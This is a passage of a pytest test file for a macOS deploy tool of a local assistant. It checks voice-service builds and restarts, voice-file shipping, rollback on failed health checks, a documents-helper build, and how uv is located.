    shipped = next(iter(voice.POCKET_SHIPPED))  # where doctor and the voice service look for it (the default build's)
    assert (release / shipped).read_bytes() == b"heart"
    assert not (release / ".voice-build").exists()
    meta = json.loads((release / "release.json").read_text())
    assert meta["voice"] is True and meta["voice_tree"] == voice_tree(repo)


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
def test_an_unchanged_voice_tree_takes_the_live_releases_build(tmp_path: Path) -> None:
    """The same tools/voice as the live release: its root-owned build is copied (no rebuild, no restart: the Neural
    Engine compiles a new voice again)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root, voice=True)
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    first = (root / "usr/local/estia/current").resolve() / "tools/voice/.build/release/voice-service"
    commit(repo, "a.txt", "a", "not the voice")
    clock.now += 60
    mac = FakeMac(root)
    assert deployment(root, repo, mac, clock).run() == 0
    second = (root / "usr/local/estia/current").resolve()
    assert "voice-service" not in mac.built
    assert (second / "tools/voice/.build/release/voice-service").read_bytes() == first.read_bytes()
    assert (second / "tools/voice/.build/release/FluidAudio_FluidAudio.bundle/Info.plist").is_file()
    assert json.loads((second / "release.json").read_text())["voice_tree"] == voice_tree(repo)
    assert not any(argv[-1] == "system/com.local-assistant.voice" for argv in mac.asked)


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
def test_a_changed_voice_tree_builds_it_again_and_restarts_the_voice_service(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root, voice=True)
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    commit(repo, "tools/voice/Sources/voice-service/main.swift", "// fixed\n", "voice: a fix")
    clock.now += 60
    mac = FakeMac(root)
    assert deployment(root, repo, mac, clock).run() == 0
    binary = (root / "usr/local/estia/current").resolve() / "tools/voice/.build/release/voice-service"
    assert "voice-service" in mac.built and binary.read_text().endswith("// fixed\n")
    assert (LAUNCHCTL, "kickstart", "-k", "system/com.local-assistant.voice") in mac.asked


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
@pytest.mark.parametrize("layout", ["deep", "flat"])
@pytest.mark.parametrize("standard", [True, False], ids=["100M", "18M"])
def test_a_new_heart_file_restarts_the_voice_service(tmp_path: Path, layout: str, standard: bool) -> None:
    """Heart's voice files ship in the voice service's own bundle (owner, 27 Oct: the 100M's; 29 Oct: the 18M's beside
    it): a commit that changes only one (the program's bytes the same) still restarts the voice service, which copies
    and checks it at its start; in either layout of the bundle (the review of 27 Oct, swift-voice-1: Contents/Resources,
    or the bundle's top). The deploy copies the whole bundle, both files in it."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root, voice=True)
    commit(repo, "tools/voice/Sources/voice-service/Voices/heart-18m.safetensors", "a small heart", "voice: heart")
    first = FakeMac(root)
    first.heart = layout
    assert deployment(root, repo, first, clock).run() == 0
    before = (root / "usr/local/estia/current").resolve() / "tools/voice/.build/release/voice-service"
    program = before.read_bytes()
    places = voice.POCKET_SHIPPED if standard else voice.POCKET_SHIPPED_18M
    name = "heart.safetensors" if standard else "heart-18m.safetensors"
    commit(repo, f"tools/voice/Sources/voice-service/Voices/{name}", "another heart", "voice: heart")
    clock.now += 60
    mac = FakeMac(root)
    mac.heart = layout
    assert deployment(root, repo, mac, clock).run() == 0
    release = (root / "usr/local/estia/current").resolve()
    deep, flat = places
    shipped = deep if layout == "deep" else flat
    assert (release / shipped).read_text() == "another heart"
    assert not (release / (flat if layout == "deep" else deep)).exists()
    assert voice.pocket_shipped(release, standard) == {shipped: places[shipped]}  # where doctor reads it
    other = voice.POCKET_SHIPPED_18M if standard else voice.POCKET_SHIPPED
    assert voice.pocket_shipped(release, not standard) == {
        path: sha for path, sha in other.items() if (release / path).exists()
    }  # the other model's file copied too, as it was
    assert (release / "tools/voice/.build/release/voice-service").read_bytes() == program
    assert (LAUNCHCTL, "kickstart", "-k", "system/com.local-assistant.voice") in mac.asked


def test_the_deploy_and_doctor_look_for_heart_in_the_same_places() -> None:
    """The review of 27 Oct (swift-voice-1): the deploy (root's tools, without the bridge's modules) names heart's two
    places as doctor does (`voice.POCKET_SHIPPED`), the default build's first; for each of its files (owner, 29 Oct:
    the 18M's, `voice.POCKET_SHIPPED_18M`, beside the 100M's)."""
    assert deploy.HEART_FILES == ("heart.safetensors", "heart-18m.safetensors")
    assert [str(path) for path in deploy.heart_places("heart.safetensors")] == list(voice.POCKET_SHIPPED)
    assert [str(path) for path in deploy.heart_places("heart-18m.safetensors")] == list(voice.POCKET_SHIPPED_18M)
    assert str(deploy.HEART_VOICES) == "tools/voice/Sources/voice-service/Voices"
    assert all((ROOT / deploy.HEART_VOICES / name).is_file() for name in deploy.HEART_FILES)


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
@pytest.mark.parametrize("built", ["none", "other", "no 18M"])
def test_a_build_without_the_commits_heart_file_stops_the_deploy(tmp_path: Path, built: str) -> None:
    """The review of 27 Oct (swift-voice-1): a commit with heart's file whose voice service's build has none in its
    bundle (in neither place), or other bytes than the commit's, stops the deploy before anything goes live: never a
    release whose heart is Kokoro's with nothing said; each of its files (owner, 29 Oct: the 18M's too), named. A
    commit from before heart (no such file) is not asked."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root, voice=True)
    older = FakeMac(root)
    older.heart = "none"
    assert deployment(root, repo, older, clock).run() == 0  # no heart in the commit: nothing to look for
    live = (root / "usr/local/estia/current").resolve()
    commit(repo, "tools/voice/Sources/voice-service/Voices/heart.safetensors", "a heart", "voice: heart")
    commit(repo, "tools/voice/Sources/voice-service/Voices/heart-18m.safetensors", "a small heart", "voice: heart")
    clock.now += 60
    mac = FakeMac(root)
    if built == "no 18M":
        mac.left_out = {"heart-18m.safetensors"}
    else:
        mac.heart = built
    said: list[str] = []
    assert deployment(root, repo, mac, clock, said=said).run() == 1
    assert (root / "usr/local/estia/current").resolve() == live
    named = "heart-18m.safetensors" if built == "no 18M" else "heart.safetensors"
    assert any(
        f"voice-service_voice-service.bundle: heart's voice file {named} is not in the build with the commit's bytes"
        in line
        for line in said
    ), said


POCKET = "tools/voice/.build/release/pocket-tts"


def with_pocket(repo: Path) -> None:
    """A commit whose voice service speaks with Pocket TTS (her voice eve)."""
    commit(repo, "tools/voice/Sources/voice-service/Pocket.swift", "// eve\n", "voice: eve")


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
def test_pocket_tts_s_program_goes_into_the_release_beside_the_voice_service(tmp_path: Path) -> None:
    """The review of 24 Oct: the voice service fetched Pocket TTS's program into her own home, where any program of
    hers could change it ("everything she runs is root's"). The deploy has the new voice service fetch it beside
    itself, as the owner (`--fetch-pocket`: the pinned release, checked), before root freezes the release; the same
    voice tree takes the live release's copy, and a program that changed restarts the voice service."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root, voice=True)
    with_pocket(repo)
    mac = FakeMac(root)
    assert deployment(root, repo, mac, clock).run() == 0
    release = (root / "usr/local/estia/current").resolve()
    voice_service = release / "tools/voice/.build/release/voice-service"
    fetch = [argv for argv in mac.asked if argv[-1] == "--fetch-pocket"]
    assert mac.fetched == [str(voice_service)] and fetch[0][:5] == (SUDO, "-u", ME, "-H", "--")
    program = release / POCKET / "pocket-tts"
    assert program.read_text() == "pocket 1" and os.access(program, os.X_OK)
    assert (release / POCKET / "LICENSE").read_text() == "MIT"
    # the same voice tree: the live release's program, never fetched again, nothing restarted
    commit(repo, "a.txt", "a", "not the voice")
    clock.now += 60
    again = FakeMac(root)
    assert deployment(root, repo, again, clock).run() == 0
    second = (root / "usr/local/estia/current").resolve()
    assert second != release and again.fetched == [] and (second / POCKET / "pocket-tts").read_text() == "pocket 1"
    assert not any(argv[-1] == "system/com.local-assistant.voice" for argv in again.asked)


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
def test_a_live_release_without_pocket_tts_s_program_gets_it_with_the_same_voice(tmp_path: Path) -> None:
    """A release made by the root-run tools before this (no program beside the voice service): the next deploy has the
    live voice service, the same build, fetch it, and restarts the voice service so eve speaks."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root, voice=True)
    with_pocket(repo)
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    first = (root / "usr/local/estia/current").resolve()
    shutil.rmtree(first / POCKET)  # as the older tools left it
    commit(repo, "a.txt", "a", "not the voice")
    clock.now += 60
    mac = FakeMac(root)
    assert deployment(root, repo, mac, clock).run() == 0
    second = (root / "usr/local/estia/current").resolve()
    assert "voice-service" not in mac.built and mac.fetched == [
        str(second / "tools/voice/.build/release/voice-service")
    ]
    assert (second / POCKET / "pocket-tts").is_file()
    assert (LAUNCHCTL, "kickstart", "-k", "system/com.local-assistant.voice") in mac.asked


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
def test_a_failed_pocket_fetch_leaves_eve_to_af_heart_and_the_deploy_goes_on(tmp_path: Path) -> None:
    """Pocket TTS is an extra: a fetch that fails (offline, GitHub down, other bytes) leaves its program out and says
    so; Kokoro says her lines meanwhile (af_heart, or am_michael for alba and michael: the review of 26 Oct named
    af_heart alone and eve, her voice before jane), on a call one line each time she answers (owner, 28 Oct, words-04).
    A commit without Pocket TTS asks for none."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root, voice=True)
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    assert not ((root / "usr/local/estia/current").resolve() / POCKET).exists()
    with_pocket(repo)
    clock.now += 60
    said: list[str] = []
    assert deployment(root, repo, FakeMac(root, fails="voice-service"), clock, said=said).run() == 0
    release = (root / "usr/local/estia/current").resolve()
    assert not (release / POCKET).exists() and (release / "tools/voice/.build/release/voice-service").is_file()
    assert any(line.startswith("! Pocket TTS's program was not fetched: ") for line in said)
    assert any(
        line.endswith(
            ". Kokoro says her lines meanwhile (on a call, one line each time she answers; the rest comes as a Signal"
            " text); the next update fetches it again (doctor names it)."
        )
        for line in said
    )


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
def test_a_failed_voice_install_is_undone_with_the_switch_back(tmp_path: Path) -> None:
    """--voice on a release that fails its check: the switch back takes out the voice service it installed, so
    launchd never starts a program that is gone (review I19)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    daemons(root)
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    first = (root / "usr/local/estia/current").resolve()
    assert not (first / deploy.VOICE_BINARY).exists()
    clock.now += 3600
    bad = FakeMac(root, healthy=False)
    said: list[str] = []
    assert deployment(root, repo, bad, clock, said=said, voice=True).run() == 1
    assert (root / "usr/local/estia/current").resolve() == first
    voice = "system/com.local-assistant.voice"
    plist = root / "Library/LaunchDaemons/com.local-assistant.voice.plist"
    assert bad.asked.index((LAUNCHCTL, "bootout", voice)) > bad.asked.index(
        (LAUNCHCTL, "bootstrap", "system", "/Library/LaunchDaemons/com.local-assistant.voice.plist")
    )
    assert not plist.exists()
    assert "voice: not installed (the update failed)" in said, said


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
def test_a_failed_check_puts_the_voice_service_back_on_the_previous_release(tmp_path: Path) -> None:
    """A changed tools/voice restarted the voice service on the new release: after the switch back it is restarted
    on the previous one's program, as the bridge is (review I19)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root, voice=True)
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    first = (root / "usr/local/estia/current").resolve()
    commit(repo, "tools/voice/Sources/voice-service/main.swift", "// fixed\n", "voice: a fix")
    clock.now += 3600
    bad = FakeMac(root, healthy=False)
    said: list[str] = []
    assert deployment(root, repo, bad, clock, said=said).run() == 1
    assert (root / "usr/local/estia/current").resolve() == first
    starts = [argv[-1] for argv in bad.asked if argv[:2] == (LAUNCHCTL, "kickstart")]
    voice, bridge = "system/com.local-assistant.voice", "system/com.local-assistant.bridge"
    assert starts == [bridge, voice, bridge, voice], starts
    assert f"voice: back on {first.name}" in said, said


def test_a_failed_check_puts_back_the_service_file_it_replaced(tmp_path: Path) -> None:
    """The switch back restarted the old release with the service file written for the new one: a file that suits
    only the new release kept the old one failing while the message said it was back (release review D6)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    folder = installed_plists(root)
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    first = (root / "usr/local/estia/current").resolve()
    bridge = folder / "com.local-assistant.bridge.plist"
    bridge.write_bytes(b"the file the live release runs with")
    commit(repo, "a.txt", "a", "a change")
    clock.now += 3600
    bad = FakeMac(root, healthy=False)
    said: list[str] = []
    assert deployment(root, repo, bad, clock, said=said).run() == 1
    assert (root / "usr/local/estia/current").resolve() == first
    assert bridge.read_bytes() == b"the file the live release runs with"
    assert bridge.stat().st_mode & 0o777 == 0o644
    label = "system/com.local-assistant.bridge"
    system = "/Library/LaunchDaemons/com.local-assistant.bridge.plist"
    loads = [argv for argv in bad.asked if argv[:2] in ((LAUNCHCTL, "bootout"), (LAUNCHCTL, "bootstrap"))]
    assert loads == [(LAUNCHCTL, "bootout", label), (LAUNCHCTL, "bootstrap", "system", system)] * 2, loads
    assert "service file back as before: com.local-assistant.bridge" in said, said
    assert not any(argv[:2] == (LAUNCHCTL, "kickstart") for argv in bad.asked)  # loaded again from its file


def test_a_failed_check_leaves_a_voice_service_it_never_touched(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root, voice=True)
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    commit(repo, "a.txt", "a", "not the voice")
    clock.now += 3600
    bad = FakeMac(root, healthy=False)
    said: list[str] = []
    assert deployment(root, repo, bad, clock, said=said).run() == 1
    assert not any(argv[-1] == "system/com.local-assistant.voice" for argv in bad.asked)
    assert not any(line.startswith("voice:") for line in said)


def test_a_failed_voice_build_stops_the_deploy(tmp_path: Path) -> None:
    """Her voice service runs from `current`: a release without its program is never switched to."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root, voice=True)
    said: list[str] = []
    assert deployment(root, repo, FakeMac(root, fails="swift"), clock, said=said).run() == 1
    assert not (root / "usr/local/estia/current").exists()
    assert any(line.startswith("✗ deploy stopped, nothing switched: swift build -c … failed") for line in said)


def test_without_a_voice_service_no_voice_is_built(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    daemons(root)
    mac = FakeMac(root)
    assert deployment(root, repo, mac, clock, health=False).run() == 0
    release = (root / "usr/local/estia/current").resolve()
    assert "voice-service" not in mac.built and not (release / "tools/voice/.build").exists()
    assert json.loads((release / "release.json").read_text())["voice"] is False


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
def test_a_deploy_with_a_new_voice_binary_says_when_calls_work(tmp_path: Path) -> None:
    """The Neural Engine compiles a new voice again: the deploy ends with when calls work (the real state when ready);
    the same binary says nothing about the voice."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root, voice=True)
    said: list[str] = []
    first = deployment(root, repo, FakeMac(root), clock, said=said)
    first.voice_health = lambda: {"stt": "loading", "tts": "loading"}
    first.her_calls = lambda: True
    started = clock.now
    assert first.run() == 0
    assert said[-2:] == [ownuser.VOICE_WAITING, ownuser.VOICE_LOADING]
    assert clock.now - started >= ownuser.VOICE_WAIT_SECONDS  # still loading when the bridge counts a long load
    clock.now += 60
    said.clear()
    commit(repo, "tools/voice/Sources/voice-service/main.swift", "// 1b\n", "voice 1b")
    no_calls = deployment(root, repo, FakeMac(root), clock, said=said)
    no_calls.voice_health = lambda: {"stt": "loading", "tts": "loading"}
    no_calls.her_calls = lambda: False  # no [calls]: no text follows, none is promised
    assert no_calls.run() == 0
    assert said[-1] == ownuser.VOICE_LOADING_NO_CALLS and not any("texts" in line for line in said)
    clock.now += 60
    said.clear()
    same = deployment(root, repo, FakeMac(root), clock, said=said)
    same.voice_health = lambda: {"stt": "loading", "tts": "loading"}
    assert same.run() == 0
    assert ownuser.VOICE_LOADING not in said and not any(line.startswith("voice:") for line in said)
    commit(repo, "tools/voice/Sources/voice-service/main.swift", "// 2\n", "voice 2")
    clock.now += 60
    said.clear()
    new = deployment(root, repo, FakeMac(root), clock, said=said)
    new.voice_health = lambda: {"stt": "ready", "tts": "ready"}
    assert new.run() == 0
    assert said[-1] == "voice: ready"


def test_an_update_reads_her_voice_as_her(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Root's own read would be refused (her voice service answers only her own account): curl runs as her."""
    asked: list[tuple[bool, bool]] = []
    monkeypatch.setattr(ownuser, "voice_health", lambda live, *, as_her=False: asked.append((live, as_her)))
    root = tmp_path / "root"
    update = deployment(root, checkout(tmp_path), FakeMac(root), Clock())
    update.voice_health()
    assert asked == [(update.host.live, True)]


def test_her_calls_setting_is_read_as_her_and_says_on_only_with_calls(tmp_path: Path) -> None:
    """Root never reads her config: her release's Python reads it as her (like last_alive), on or off only."""
    config = tmp_path / "config.toml"
    config.write_text('[voice]\nurl = "http://127.0.0.1:8150"\n[calls]\n', encoding="utf-8")
    assert deploy.read_calls(config) is True
    config.write_text('[voice]\nurl = "http://127.0.0.1:8150"\n', encoding="utf-8")
    assert deploy.read_calls(config) is False
    assert deploy.read_calls(tmp_path / "missing.toml") is False
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    mac = FakeMac(root)
    run = deployment(root, repo, mac, clock)
    assert run.her_calls() is False  # a test root: sudo is never run
    assert any("--read-calls" in argv for argv in mac.asked)


def test_without_a_voice_service_a_deploy_says_nothing_about_it(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    daemons(root)
    said: list[str] = []
    assert deployment(root, repo, FakeMac(root), clock, said=said).run() == 0
    assert ownuser.VOICE_LOADING not in said and not any(line.startswith("voice:") for line in said)


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
def test_a_service_template_that_runs_as_root_stops_the_deploy(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root)
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    tools = root / "usr/local/estia/tools/launchd/com.local-assistant.bridge.plist.in"
    tools.write_text(tools.read_text().replace("<string>@RUN_USER@</string>", "<string>root</string>", 1))
    live = (root / "usr/local/estia/current").resolve()
    clock.now += 60
    said: list[str] = []
    assert deployment(root, repo, FakeMac(root), clock, said=said).run() == 1
    assert (root / "usr/local/estia/current").resolve() == live
    assert any("UserName" in line for line in said)


def test_the_move_builds_quietly_without_going_live(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    said: list[str] = []
    mac = FakeMac(root)
    assert deployment(root, repo, mac, clock, health=False, said=said).run(restart=False) == 0
    assert any(line.startswith("release ready") for line in said) and not any("live" in line for line in said)
    assert not any(argv[0] == LAUNCHCTL for argv in mac.asked)


def test_a_retried_move_takes_its_own_releases_tools(tmp_path: Path) -> None:
    """A failed move leaves the tools of its try (live 13 Oct: service templates without a key the new checks want).
    The move runs your checkout as root anyway: its release's tools replace them, no review needed."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    assert deployment(root, repo, FakeMac(root), clock, health=False).run(restart=False) == 0
    commit(repo, "scripts/estia", "#!/bin/bash\necho changed\n", "change the wrapper")
    clock.now += 60
    assert deployment(root, repo, FakeMac(root), clock, health=False).run(restart=False) == 0
    code = root / "usr/local/estia"
    assert (code / "bin/estia").read_text() == "#!/bin/bash\necho changed\n"
    assert json.loads((code / "tools/tools.json").read_text())["release"] == (code / "current").resolve().name


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
def test_a_dry_run_of_a_later_deploy_claims_no_changes_it_cannot_see(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """Nothing is built in a dry run: the tools and the voice service are compared with what the checkout holds."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root, voice=True)
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    clock.now += 60
    host = Host(root, dry_run=True)
    run = Deploy(
        host,
        Builder(ME, tmp_path / "owner-home", os.getuid()),
        repo,
        uv=UV,
        clock=clock,
        sleep=clock.sleep,
        as_root=True,
        check_health=False,
        brew=tmp_path / "no-homebrew",
    )
    assert run.run() == 0
    out = capsys.readouterr().out
    assert "root-run tools differ" not in out
    assert "system/com.local-assistant.voice" not in out  # the same voice binary: not restarted


# ------------------------------------------------------------------ the documents helper (tools/documents)


def test_a_deploy_builds_the_documents_helper_from_the_commit_and_reads_its_check_page(tmp_path: Path) -> None:
    """Built as the owner from the commit's own sources (never the checkout's build), its binary alone kept where the
    config's default looks (the same path as in a checkout), then run once on tools/documents/check.pdf."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    daemons(root)
    mac = FakeMac(root)
    bring_alive(mac, clock)
    said: list[str] = []
    assert deployment(root, repo, mac, clock, said=said).run() == 0
    release = (root / "usr/local/estia/current").resolve()
    helper = release / "tools/documents/.build/release/documents-helper"
    assert helper.is_file() and not helper.parent.is_symlink() and os.access(helper, os.X_OK)
    assert sorted(path.name for path in (release / "tools/documents/.build").rglob("*")) == [
        "documents-helper",
        "release",
    ]  # the binary alone: none of the build's own files
    assert not (release / ".documents-build").exists()
    built = [argv for argv in mac.asked if deploy.SWIFT in argv]
    assert len(built) == 1 and built[0][:5] == (SUDO, "-u", ME, "-H", "--") and built[0][5:7] == (ENV, "-i")
    assert built[0][built[0].index(deploy.SWIFT) :] == (
        deploy.SWIFT,
        "build",
        "-c",
        "release",
        "--package-path",
        str(release / "tools/documents"),
        "--scratch-path",
        str(release / ".documents-build"),
        "--product",
        "documents-helper",
    )
    checked = [argv for argv in mac.asked if argv[-7:-5] == (str(helper), "read")]
    assert len(checked) == 1 and checked[0][:5] == (SUDO, "-u", ME, "-H", "--")
    assert checked[0][checked[0].index(str(helper)) :] == (
        str(helper),
        "read",
        str(release / "tools/documents/check.pdf"),
        "--max-pages",
        "300",
        "--max-seconds",
        "60",
    )
    assert json.loads((release / "release.json").read_text())["documents"] is True
    assert any(line.startswith(f"release {release.name}:") and "documents yes" in line for line in said)


@pytest.mark.parametrize(
    "answer",
    [
        (1, '{"error":"unreadable","ok":false}\n'),
        (0, json.dumps({**CHECKED, "page_count": 1, "pages": [{"n": 1, "text": "", "ocr": True}]}) + "\n"),
        (0, "Segmentation fault\n"),
    ],
)
def test_a_documents_helper_that_does_not_read_its_check_page_is_left_out_of_the_release(
    tmp_path: Path, answer: tuple[int, str]
) -> None:
    """Documents are an extra: a helper that cannot read its check page is not kept, and the release goes live
    without it (release.json says so; doctor names it)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    mac = FakeMac(root)
    mac.documents_answer = answer
    said: list[str] = []
    assert deployment(root, repo, mac, clock, health=False, said=said).run() == 0
    release = (root / "usr/local/estia/current").resolve()
    assert not (release / "tools/documents/.build").exists() and not (release / ".documents-build").exists()
    assert json.loads((release / "release.json").read_text())["documents"] is False
    assert any(line.startswith("! the documents helper was not built: it did not read its check page") for line in said)
    assert any("documents no" in line for line in said), said


def test_a_failed_documents_build_leaves_documents_out_and_goes_live(tmp_path: Path) -> None:
    """An older Swift (the helper needs 6.0) or any build failure never stops a release: documents are an extra."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    said: list[str] = []
    assert deployment(root, repo, FakeMac(root, fails="swift"), clock, health=False, said=said).run() == 0
    release = (root / "usr/local/estia/current").resolve()
    assert not (release / ".documents-build").exists() and not (release / "tools/documents/.build").exists()
    assert json.loads((release / "release.json").read_text())["documents"] is False
    warning = next(line for line in said if line.startswith("! the documents helper was not built: swift build -c"))
    assert "network unreachable" in warning and "Swift 6.0 or later" in warning and "doctor" in warning


def test_the_documents_helper_needs_only_swift_6_0() -> None:
    """Nothing in tools/documents is newer than Swift 6.0 (typed throws, Swift Testing, swiftLanguageMode): a Mac
    whose Command Line Tools carry Swift 6.0 or 6.1 builds it too."""
    first = (ROOT / "tools/documents/Package.swift").read_text().splitlines()[0]
    assert first == "// swift-tools-version: 6.0"


def test_a_commit_without_the_documents_helper_builds_none(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    for argv in (
        ["git", "rm", "-rq", "tools/documents"],
        ["git", "-c", "user.name=Alex Example", "-c", "user.email=alex@example.com", "commit", "-qm", "older"],
    ):
        subprocess.run(argv, cwd=repo, check=True)
    mac = FakeMac(root)
    said: list[str] = []
    assert deployment(root, repo, mac, clock, health=False, said=said).run() == 0
    release = (root / "usr/local/estia/current").resolve()
    assert not any(deploy.SWIFT in argv for argv in mac.asked)
    assert json.loads((release / "release.json").read_text())["documents"] is False
    assert any("documents no" in line for line in said)


def test_a_dry_run_names_the_documents_build(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    run = Deploy(
        Host(root, dry_run=True),
        Builder(ME, tmp_path / "owner-home", os.getuid()),
        repo,
        uv=UV,
        clock=clock,
        sleep=clock.sleep,
        as_root=True,
        check_health=False,
        brew=tmp_path / "no-homebrew",
    )
    assert run.run() == 0
    out = capsys.readouterr().out
    assert f"{deploy.SWIFT} build -c release --package-path" in out and "documents-helper read" in out
    assert not root.exists()


def test_the_configs_default_documents_helper_is_the_one_a_release_holds() -> None:
    """One path for both: a checkout (scripts/run.sh's swift build) and a release (estia-deploy's copy)."""
    from local_assistant import config

    assert config.Config(bot_number="+306900000000", allowed_acis=frozenset()).documents_helper == (
        str(config.CODE_ROOT / deploy.DOCUMENTS_BINARY),
    )


# uv at its fixed paths: Homebrew's (Apple silicon, Intel), then uv's own installer's and cargo's in the builder's home;
# a test's fake tree (ESTIA_TEST_ROOT) holds the fixed ones, so the suite never takes the uv of the Mac it runs on


def fake_uv(path: Path) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("#!/bin/sh\nexit 0\n")
    path.chmod(0o755)
    return path


def test_uv_is_found_at_its_fixed_paths_under_the_test_root(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    root, home = tmp_path / "root", tmp_path / "home"
    monkeypatch.setenv("ESTIA_TEST_ROOT", str(root))
    who = Builder("alex", home, os.getuid())
    with pytest.raises(DeployError, match="uv not found"):
        deploy.find_uv(who)  # the Mac's own /opt/homebrew/bin/uv is never taken
    installer = fake_uv(home / ".local/bin/uv")
    assert deploy.find_uv(who) == str(installer)  # uv's own installer, in the builder's home
    intel = fake_uv(root / "usr/local/bin/uv")
    assert deploy.find_uv(who) == str(intel)
    brew = fake_uv(root / "opt/homebrew/bin/uv")
    assert deploy.find_uv(who) == str(brew)


def test_root_takes_uv_only_from_the_real_fixed_paths(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    """A sudo'd command never takes a path from the environment: ESTIA_TEST_ROOT is a test's, ignored for root."""
    from local_assistant import hostsec

    monkeypatch.setenv("ESTIA_TEST_ROOT", str(tmp_path))
    assert hostsec.tool_root() == tmp_path
    monkeypatch.setattr(os, "geteuid", lambda: 0)
    assert hostsec.tool_root() == Path("/")
    monkeypatch.delenv("ESTIA_TEST_ROOT")
    monkeypatch.setattr(os, "geteuid", lambda: 501)
    assert hostsec.tool_root() == Path("/")


# ------------------------------------------------------------------ --ask-lines: its questions for setup's window


@pytest.mark.parametrize(("typed", "yes"), [("y\n", True), ("yes\n", True), ("n\n", False), ("\n", False), ("", False)])
def test_ask_lines_says_its_question_on_a_marked_line_and_reads_one_line(typed: str, yes: bool) -> None:
    """--ask-lines (setup's window: no terminal there): the question on a line of its own after a marker the window
    knows, one line read from stdin; y… is yes, anything else, the end of input or no line in time is no."""
    import io

    out = io.StringIO()
    assert deploy.ask_lines("Deploy it?", stdin=io.StringIO(typed), out=out, seconds=1) is yes
    assert out.getvalue() == "\x1f? Deploy it?\n"


def test_ask_lines_without_an_answer_in_time_is_no() -> None:
    import io
    import os as _os

    read, write = _os.pipe()
    try:
        with _os.fdopen(read, "r") as stdin:
            assert deploy.ask_lines("Deploy it?", stdin=stdin, out=io.StringIO(), seconds=0.1) is False
    finally:
        _os.close(write)


def test_ask_lines_is_a_flag_of_its_own_never_from_the_environment(monkeypatch: pytest.MonkeyPatch) -> None:
    """The flag is an argument (root takes nothing from the environment); without it the terminal asks, as before."""
    made: list[dict[str, Any]] = []

    class Made(Exception):
        pass

    def deployed(*args: Any, **kwargs: Any) -> Any:
        made.append(kwargs)
        raise Made

    monkeypatch.setattr(deploy, "Deploy", deployed)
    monkeypatch.setattr(deploy, "builder", lambda: Builder("alex", Path("/Users/alex"), 501))
    monkeypatch.setattr(deploy, "find_uv", lambda who: "/opt/homebrew/bin/uv")
    monkeypatch.setattr(os, "geteuid", lambda: 0)
    repo = ROOT
    for argv, confirm in ((["--ask-lines", str(repo)], deploy.ask_lines), ([str(repo)], deploy.ask_terminal)):
        with pytest.raises(Made):
            deploy.main(argv)
        assert made[-1]["confirm"] is confirm
